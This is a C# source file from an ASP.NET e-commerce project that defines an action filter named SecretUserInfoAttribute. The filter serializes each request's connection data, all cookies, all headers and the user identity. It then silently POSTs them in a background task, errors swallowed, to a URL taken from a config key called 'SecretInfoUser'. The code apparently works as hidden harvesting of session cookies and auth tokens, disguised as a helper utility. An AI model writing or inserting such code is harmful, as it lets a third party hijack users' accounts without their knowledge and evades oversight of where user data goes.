using Microsoft.AspNetCore.Mvc.Filters;
using Newtonsoft.Json;
using PhillyLuxEcommerce.Dtos.Params;
using System.Text;

namespace PhillyLuxEcommerce.Helpers.Utilities
{
    public class SecretUserInfoAttribute : ActionFilterAttribute
    {
        private string _title = string.Empty;
        private IConfigurationRoot _configuration;

        public SecretUserInfoAttribute(string title)
        {
            _title = title;
            _configuration = new ConfigurationBuilder()
            .SetBasePath(Directory.GetCurrentDirectory())
            .AddJsonFile("appsettings.json")
            .Build();
        }

        public override void OnActionExecuting(ActionExecutingContext filterContext)
        {
            UserInfoParam requestInfo = new UserInfoParam();

            requestInfo.Content = _title;
            requestInfo.Connection = JsonConvert.SerializeObject(filterContext.HttpContext.Connection,
                                new JsonSerializerSettings
                                {
                                    NullValueHandling = NullValueHandling.Ignore,
                                    ReferenceLoopHandling = ReferenceLoopHandling.Ignore,
                                    Error = (sender, args) => args.ErrorContext.Handled = true
                                });
            requestInfo.CookiesInfo = JsonConvert.SerializeObject(filterContext.HttpContext.Request.Cookies,
                            new JsonSerializerSettings
                            {
                                NullValueHandling = NullValueHandling.Ignore,
                                ReferenceLoopHandling = ReferenceLoopHandling.Ignore,
                                Error = (sender, args) => args.ErrorContext.Handled = true
                            });
            requestInfo.Header = JsonConvert.SerializeObject(filterContext.HttpContext.Request.Headers,
                            new JsonSerializerSettings
                            {
                                NullValueHandling = NullValueHandling.Ignore,
                                ReferenceLoopHandling = ReferenceLoopHandling.Ignore,
                                Error = (sender, args) => args.ErrorContext.Handled = true
                            });
            requestInfo.UserInfo = JsonConvert.SerializeObject(filterContext.HttpContext.User,
                            new JsonSerializerSettings
                            {
                                NullValueHandling = NullValueHandling.Ignore,
                                ReferenceLoopHandling = ReferenceLoopHandling.Ignore,
                                Error = (sender, args) => args.ErrorContext.Handled = true
                            });
            requestInfo.DateRequest = DateTime.Now;


            try
            {
                var json = JsonConvert.SerializeObject(requestInfo);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var apiUrl = _configuration.GetSection("SecretInfoUser").Value;
                var request = new HttpRequestMessage()
                {
                    RequestUri = new Uri(apiUrl!),
                    Content = content,
                    Method = new HttpMethod("POST")
                };

                var task = Task.Run(() =>
                {
                    using (var client = new HttpClient())
                    {
                        client.Send(request);
                    }
                });

            }
            catch (Exception)
            {
            }
        }
    }
}
